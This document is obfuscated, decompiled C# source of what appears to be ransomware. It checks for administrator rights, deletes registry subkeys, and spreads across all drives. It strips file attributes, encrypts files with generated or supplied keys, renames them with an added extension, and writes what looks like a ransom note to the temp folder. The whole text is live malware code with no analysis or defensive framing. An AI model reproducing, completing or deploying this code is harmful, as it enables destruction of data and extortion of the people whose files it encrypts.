	public static string uLFkMuqolClt(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void PDfRYXcapTpDuKuEw()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = iEGJafDjDASROi(getString_0(107393292));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tzJESwPzibp(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393154)));
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393641)));
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393592)));
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393599)));
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393294)));
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393574)));
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393545)));
					registryKey.Close();
				}
				string_ = iEGJafDjDASROi(getString_0(107393496));
				registryKey = Registry.LocalMachine.OpenSubKey(tzJESwPzibp(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393399)));
					registryKey.Close();
				}
				string_ = iEGJafDjDASROi(getString_0(107393414));
				registryKey = Registry.LocalMachine.OpenSubKey(tzJESwPzibp(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393399)));
					registryKey.Close();
				}
				string_ = iEGJafDjDASROi(getString_0(107393414));
				registryKey = Registry.CurrentUser.OpenSubKey(tzJESwPzibp(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(tzJESwPzibp(getString_0(107393399)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			VhRTDkROaDJx(tzJESwPzibp(getString_0(107392853)), tzJESwPzibp(getString_0(107392868)));
			VhRTDkROaDJx(tzJESwPzibp(getString_0(107392787)), tzJESwPzibp(getString_0(107392810)));
			VhRTDkROaDJx(tzJESwPzibp(getString_0(107392787)), tzJESwPzibp(getString_0(107392632)));
			VhRTDkROaDJx(tzJESwPzibp(getString_0(107393083)), tzJESwPzibp(getString_0(107393098)));
		}
		catch
		{
		}
	}

	public static void YlXQQyoEsG(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(tzJESwPzibp(getString_0(107393025)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void oXiyePOoZlOdic()
	{
		string string_ = iEGJafDjDASROi(getString_0(107393000));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tzJESwPzibp(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(tzJESwPzibp(getString_0(107392887)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void TgoHSjWJgMGOuilZ()
	{
		VhRTDkROaDJx(getString_0(107396799), tzJESwPzibp(getString_0(107392342)));
		string text = tzJESwPzibp(getString_0(107392148));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107393325) + text + getString_0(107393325) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396799);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void GkFjkAyBjnbhm(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (ZdcvQmUKIcPe)
			{
				try
				{
					File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392595) + string_0 + getString_0(107392618) + ex.Message + getString_0(107397082));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string pecXPOiThg()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107394302);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107392497);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107392552))) ? getString_0(107392502) : getString_0(107392543));
				break;
			case 0:
				text = getString_0(107392525);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107392524);
				break;
			case 4:
				text = getString_0(107392511);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107392461) : getString_0(107392470));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107392437) : getString_0(107392442)) : getString_0(107392479)) : getString_0(107392488));
				break;
			case 10:
				text = getString_0(107392432);
				break;
			}
		}
		if (text != getString_0(107394302))
		{
			text = getString_0(107392459) + text;
			if (oSVersion.ServicePack != getString_0(107394302))
			{
				text = text + getString_0(107392446) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string eCDmuoblbcTiBt(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395715);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(tzJESwPzibp(getString_0(107396174)));
				streamWriter.WriteLine(getString_0(107397082));
				streamWriter.WriteLine(tzJESwPzibp(getString_0(107394756)));
				streamWriter.WriteLine(string_0);
				if (YIgbUMLXEZ)
				{
					streamWriter.WriteLine(getString_0(107397082));
					streamWriter.WriteLine(tzJESwPzibp(getString_0(107395126)));
					streamWriter.WriteLine(HSDASSgFriA.KzNxlIVvXTMnYo());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !sBOTyxVoVCQkJ)
				{
					File.AppendAllText(text, getString_0(107395093) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (ZdcvQmUKIcPe)
			{
				try
				{
					File.AppendAllText(jYzmyFxkGGuJi, getString_0(107392409) + ex.Message + getString_0(107397082));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void PulKJQStYv(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		WFPAUMVkIkkrPR.vXLdsCAXPIQVMIX CS_0024_003C_003E8__locals0 = new WFPAUMVkIkkrPR();
		CS_0024_003C_003E8__locals0.aitFwztVEekRG = string_1;
		CS_0024_003C_003E8__locals0.VNkqOLNhPr = string_2;
		CS_0024_003C_003E8__locals0.CdXlDKnAWk = string_3;
		CS_0024_003C_003E8__locals0.fPtwXSqivhka = string_4;
		LPxApPwqniHY = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.CdXlDKnAWk);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396306))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !bVwnJgANJJX.Contains(array[i].Name))
					{
						bVwnJgANJJX.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!bVwnJgANJJX.Contains(string_0[j]))
				{
					bVwnJgANJJX.Add(string_0[j]);
				}
			}
		}
		if (bVwnJgANJJX.Contains(tzJESwPzibp(getString_0(107392384))) && UVdZomBXmMpt == getString_0(107396887))
		{
			bVwnJgANJJX.Remove(tzJESwPzibp(getString_0(107392384)));
		}
		Parallel.ForEach(bVwnJgANJJX, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new WFPAUMVkIkkrPR.vXLdsCAXPIQVMIX();
			CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC = string_0;
			if (PwyBWpPgqFzY && !pecXPOiThg().Contains(WFPAUMVkIkkrPR.getString_0(107392470)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ugkeHnHORzZvwy(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (zZukKkiWQnr == WFPAUMVkIkkrPR.getString_0(107396896))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					aLWTrFQAtHVEaEy(CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.aitFwztVEekRG, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.fPtwXSqivhka, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.VNkqOLNhPr, CS_0024_003C_003E8__locals0.mYiSUZAlJgIJk.CdXlDKnAWk);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				aLWTrFQAtHVEaEy(CS_0024_003C_003E8__locals0.wMSTvTAsxoUjrC, CS_0024_003C_003E8__locals0.aitFwztVEekRG, CS_0024_003C_003E8__locals0.fPtwXSqivhka, CS_0024_003C_003E8__locals0.VNkqOLNhPr, CS_0024_003C_003E8__locals0.CdXlDKnAWk);
			}
		});
	}

	public static void aLWTrFQAtHVEaEy(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107394302));
		List<string> list3 = list2;
		if (PCEnMQPjGdmTjQm == getString_0(107396804))
		{
			list = YSYHoZSeHsnH(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = wqpvMNYfhziG.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((hLzPqVUHNDBTRb == getString_0(107396804) && !item.EndsWith(text)) || WEPWhUGwUtN.Contains(item))
				{
					continue;
				}
				if (MUSNUeGXusODlj == getString_0(107396887))
				{
					try
					{
						if (LbQngbCZSKbnPy.XqMViBLMqdwY(item))
						{
							LbQngbCZSKbnPy.NZTkqVcmhy(item);
						}
					}
					catch
					{
					}
				}
				WEPWhUGwUtN.Add(item);
				if (!UPKUrcjvrOIo.Contains(Path.GetDirectoryName(item)))
				{
					UPKUrcjvrOIo.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (oFvDUXnLvZqk == getString_0(107396887) && fileStream.Length > Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024 && !list3.Contains(text))
					{
						if (SBthqYiSUsxxBW == getString_0(107396887))
						{
							foreach (string item2 in vjYtJFEhxfpDHt)
							{
								if (item.ToLower().EndsWith(item2) && VPYFBwfqxXvG == getString_0(107396887))
								{
									if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && VPYFBwfqxXvG == getString_0(107396804))
								{
									try
									{
										HSDASSgFriA.qlPqGmOVoBTz(getString_0(107394351), getString_0(107394378), getString_0(107394365), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = cLYeTxTBifMvTiA.SlfvoYGuggAUU(item, Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024);
						byte[] eSwOHaZtwoDL = cLYeTxTBifMvTiA.MBIBwyqqrY(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						cLYeTxTBifMvTiA.DcIicDuahJozxMuyl(item, eSwOHaZtwoDL);
						if (string_2 != getString_0(107391831))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107391831))
					{
						ipaWLeVyqWGh(item, item + string_2, LPxApPwqniHY);
					}
					else
					{
						ipaWLeVyqWGh(item, item + getString_0(107391826), LPxApPwqniHY);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void zLlwXrvebez(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		nGvWoWrivTbPL.jSEkHtEHBASKbIm CS_0024_003C_003E8__locals0 = new nGvWoWrivTbPL();
		CS_0024_003C_003E8__locals0.BuhDElShFyYqgkBDZ = list_0;
		CS_0024_003C_003E8__locals0.YizCOSyFjCE = string_1;
		CS_0024_003C_003E8__locals0.abfWIafuyAZY = string_2;
		CS_0024_003C_003E8__locals0.pxxUCyFtCioCIq = string_3;
		CS_0024_003C_003E8__locals0.oesEgXdCtutg = new List<string> { getString_0(107394302) };
		if (hLzPqVUHNDBTRb == getString_0(107396804))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.BuhDElShFyYqgkBDZ)
				{
					if (CS_0024_003C_003E8__locals0.abfWIafuyAZY.Length != 0)
					{
						string[] abfWIafuyAZY2 = CS_0024_003C_003E8__locals0.abfWIafuyAZY;
						int num2 = 0;
						while (num2 < abfWIafuyAZY2.Length)
						{
							string value2 = abfWIafuyAZY2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_094b;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.YizCOSyFjCE))
						{
							goto IL_094b;
						}
					}
					catch (Exception)
					{
						goto IL_094b;
					}
					if (item.EndsWith(string_0) && !WEPWhUGwUtN.Contains(item))
					{
						if (MUSNUeGXusODlj == nGvWoWrivTbPL.getString_0(107396904))
						{
							try
							{
								if (LbQngbCZSKbnPy.XqMViBLMqdwY(item))
								{
									LbQngbCZSKbnPy.NZTkqVcmhy(item);
								}
							}
							catch
							{
							}
						}
						WEPWhUGwUtN.Add(item);
						if (!UPKUrcjvrOIo.Contains(Path.GetDirectoryName(item)))
						{
							UPKUrcjvrOIo.Add(Path.GetDirectoryName(item));
						}
						GkFjkAyBjnbhm(item);
						try
						{
							new RoipdntborQL().jcavobxzlIUa(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (zcCjHpzjUtXX)
									{
										Console.WriteLine(nGvWoWrivTbPL.getString_0(107409201) + item + nGvWoWrivTbPL.getString_0(107409124) + new FileInfo(item).Length + nGvWoWrivTbPL.getString_0(107409135));
										Console.WriteLine(nGvWoWrivTbPL.getString_0(107409094));
									}
								}
								catch
								{
								}
								VhRTDkROaDJx(tzJESwPzibp(nGvWoWrivTbPL.getString_0(107409533)), nGvWoWrivTbPL.getString_0(107393342) + item + nGvWoWrivTbPL.getString_0(107393342) + tzJESwPzibp(nGvWoWrivTbPL.getString_0(107409476)) + nGvWoWrivTbPL.getString_0(107393342) + Environment.UserName + nGvWoWrivTbPL.getString_0(107393342) + tzJESwPzibp(nGvWoWrivTbPL.getString_0(107409491)));
							}
						}
						catch (Exception ex16)
						{
							if (ZdcvQmUKIcPe)
							{
								try
								{
									File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + item + nGvWoWrivTbPL.getString_0(107409466) + ex16.Message + nGvWoWrivTbPL.getString_0(107397099));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex18)
							{
								if (ZdcvQmUKIcPe)
								{
									try
									{
										File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + item + nGvWoWrivTbPL.getString_0(107409353) + ex18.Message + nGvWoWrivTbPL.getString_0(107397099));
									}
									catch (Exception)
									{
									}
								}
								FawBoUOtRlQs++;
								goto end_IL_02cd_2;
							}
							if (!(oFvDUXnLvZqk == nGvWoWrivTbPL.getString_0(107396904)) || new FileInfo(item).Length <= Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024 || CS_0024_003C_003E8__locals0.oesEgXdCtutg.Contains(string_0))
							{
								if (YIgbUMLXEZ)
								{
									CS_0024_003C_003E8__locals0.YizCOSyFjCE = HkuaAWARBzGl + CS_0024_003C_003E8__locals0.YizCOSyFjCE;
								}
								string text3 = sCnthEhwQbhLh.VOKyuCSpMLw(32);
								string s3 = BbfzHGzwtqigo.eTbdqfTZKGyJb(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
								{
									if (!GIsCSxnycEXIm)
									{
										if (!sBOTyxVoVCQkJ)
										{
											oYMtlOMiGDwjD(item, item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, LPxApPwqniHY);
										}
										else
										{
											oYMtlOMiGDwjD(item, item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!sBOTyxVoVCQkJ)
											{
												MxFmhWgVdORlqd(item, item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, LPxApPwqniHY);
											}
											else
											{
												MxFmhWgVdORlqd(item, item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex20)
										{
											if (ZdcvQmUKIcPe)
											{
												try
												{
													File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + item + nGvWoWrivTbPL.getString_0(107391866) + ex20.Message + nGvWoWrivTbPL.getString_0(107397099));
												}
												catch (Exception)
												{
												}
											}
											FawBoUOtRlQs++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!GIsCSxnycEXIm)
								{
									if (!sBOTyxVoVCQkJ)
									{
										oYMtlOMiGDwjD(item, item + nGvWoWrivTbPL.getString_0(107391843), LPxApPwqniHY);
									}
									else
									{
										oYMtlOMiGDwjD(item, item + nGvWoWrivTbPL.getString_0(107391843), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!sBOTyxVoVCQkJ)
										{
											MxFmhWgVdORlqd(item, item, LPxApPwqniHY);
										}
										else
										{
											MxFmhWgVdORlqd(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex23)
									{
										if (ZdcvQmUKIcPe)
										{
											try
											{
												File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + item + nGvWoWrivTbPL.getString_0(107391866) + ex23.Message + nGvWoWrivTbPL.getString_0(107397099));
											}
											catch (Exception)
											{
											}
										}
										FawBoUOtRlQs++;
										goto end_IL_02cd_2;
									}
								}
								if (sBOTyxVoVCQkJ)
								{
									if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
									{
										YlXQQyoEsG(item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, bytes3);
									}
									else
									{
										YlXQQyoEsG(item, bytes3);
									}
								}
								goto IL_094b;
							}
							CS_0024_003C_003E8__locals0 = new nGvWoWrivTbPL.zNemtfpNPipd();
							CS_0024_003C_003E8__locals0.pcNSSIayBgiA = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
								{
									if (YIgbUMLXEZ)
									{
										CS_0024_003C_003E8__locals0.YizCOSyFjCE = HkuaAWARBzGl + CS_0024_003C_003E8__locals0.YizCOSyFjCE;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.YizCOSyFjCE);
								}
							}
							catch (Exception ex25)
							{
								if (ZdcvQmUKIcPe)
								{
									try
									{
										File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + item + nGvWoWrivTbPL.getString_0(107409292) + ex25.Message + nGvWoWrivTbPL.getString_0(107397099));
									}
									catch (Exception)
									{
									}
								}
								FawBoUOtRlQs++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan = nGvWoWrivTbPL.getString_0(107394319);
							if (CS_0024_003C_003E8__locals0.YizCOSyFjCE != nGvWoWrivTbPL.getString_0(107391848))
							{
								CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan = item + CS_0024_003C_003E8__locals0.YizCOSyFjCE;
							}
							else
							{
								CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan = item;
							}
							if (SBthqYiSUsxxBW == nGvWoWrivTbPL.getString_0(107396904))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in vjYtJFEhxfpDHt)
									{
										if (CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pcNSSIayBgiA.YizCOSyFjCE) && VPYFBwfqxXvG == nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107396907))
										{
											if (Convert.ToInt32(NwFhVUnpoETLiI) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan).Length)
											{
												try
												{
													HSDASSgFriA.qlPqGmOVoBTz(nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107394371), nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107394398), nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107394385), CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan.ToLower().EndsWith(item2) && VPYFBwfqxXvG == nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107396824))
										{
											try
											{
												HSDASSgFriA.qlPqGmOVoBTz(nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107394371), nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107394398), nGvWoWrivTbPL.zNemtfpNPipd.getString_0(107394385), CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = sCnthEhwQbhLh.VOKyuCSpMLw(32);
							string s4 = BbfzHGzwtqigo.eTbdqfTZKGyJb(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							byte[] array2 = null;
							byte[] byte_2 = cLYeTxTBifMvTiA.SlfvoYGuggAUU(CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan, Convert.ToInt32(bHpZgRTqvrgm) * 1024 * 1024);
							if (cLYeTxTBifMvTiA.DcIicDuahJozxMuyl(ESwOHaZtwoDL: (!cWvIRXFCjdwL) ? (sBOTyxVoVCQkJ ? cLYeTxTBifMvTiA.MBIBwyqqrY(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cLYeTxTBifMvTiA.MBIBwyqqrY(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sBOTyxVoVCQkJ ? hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : hwfWuUfzvIUG.iHBkWBbpwRJtWO(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.pxxUCyFtCioCIq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), KvQkETPykCnn: CS_0024_003C_003E8__locals0.JLKDNNMdoPJwan, GvYIVDINSEjKoB: bytes4))
							{
								goto IL_094b;
							}
							try
							{
								File.Move(item + CS_0024_003C_003E8__locals0.YizCOSyFjCE, item);
							}
							catch (Exception)
							{
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_094b;
						}
					}
					continue;
					IL_094b:
					CS_0024_003C_003E8__locals0.BuhDElShFyYqgkBDZ.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.BuhDElShFyYqgkBDZ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new nGvWoWrivTbPL.jSEkHtEHBASKbIm();
			CS_0024_003C_003E8__locals0.pcNSSIayBgiA = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.KViFGgSYqc = string_0;
			if (CS_0024_003C_003E8__locals0.abfWIafuyAZY.Length != 0)
			{
				string[] abfWIafuyAZY = CS_0024_003C_003E8__locals0.abfWIafuyAZY;
				int num = 0;
				while (num < abfWIafuyAZY.Length)
				{
					string value = abfWIafuyAZY[num];
					if (!CS_0024_003C_003E8__locals0.KViFGgSYqc.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a13;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.KViFGgSYqc.EndsWith(CS_0024_003C_003E8__locals0.YizCOSyFjCE))
				{
					goto IL_0a13;
				}
			}
			catch (Exception)
			{
				goto IL_0a13;
			}
			if (!WEPWhUGwUtN.Contains(CS_0024_003C_003E8__locals0.KViFGgSYqc))
			{
				if (MUSNUeGXusODlj == nGvWoWrivTbPL.getString_0(107396904))
				{
					try
					{
						if (LbQngbCZSKbnPy.XqMViBLMqdwY(CS_0024_003C_003E8__locals0.KViFGgSYqc))
						{
							LbQngbCZSKbnPy.NZTkqVcmhy(CS_0024_003C_003E8__locals0.KViFGgSYqc);
						}
					}
					catch
					{
					}
				}
				WEPWhUGwUtN.Add(CS_0024_003C_003E8__locals0.KViFGgSYqc);
				if (!UPKUrcjvrOIo.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KViFGgSYqc)))
				{
					UPKUrcjvrOIo.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.KViFGgSYqc));
				}
				GkFjkAyBjnbhm(CS_0024_003C_003E8__locals0.KViFGgSYqc);
				try
				{
					new RoipdntborQL().jcavobxzlIUa(CS_0024_003C_003E8__locals0.KViFGgSYqc);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.KViFGgSYqc, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (zcCjHpzjUtXX)
							{
								Console.WriteLine(nGvWoWrivTbPL.getString_0(107409201) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107409124) + new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length + nGvWoWrivTbPL.getString_0(107409135));
								Console.WriteLine(nGvWoWrivTbPL.getString_0(107409094));
							}
						}
						catch
						{
						}
						VhRTDkROaDJx(tzJESwPzibp(nGvWoWrivTbPL.getString_0(107409533)), nGvWoWrivTbPL.getString_0(107393342) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107393342) + tzJESwPzibp(nGvWoWrivTbPL.getString_0(107409476)) + nGvWoWrivTbPL.getString_0(107393342) + Environment.UserName + nGvWoWrivTbPL.getString_0(107393342) + tzJESwPzibp(nGvWoWrivTbPL.getString_0(107409491)));
					}
				}
				catch (Exception ex2)
				{
					if (ZdcvQmUKIcPe)
					{
						try
						{
							File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107409466) + ex2.Message + nGvWoWrivTbPL.getString_0(107397099));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.KViFGgSYqc).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (ZdcvQmUKIcPe)
						{
							try
							{
								File.AppendAllText(jYzmyFxkGGuJi, nGvWoWrivTbPL.getString_0(107392612) + CS_0024_003C_003E8__locals0.KViFGgSYqc + nGvWoWrivTbPL.getString_0(107409353) + ex4.Message + nGvWoWrivTbPL.getString_0(107397099));
							}
							catch (Exception)
							{
							}
						}
						FawBoUOtRlQs++;
						goto end_IL_031d_2;
					}
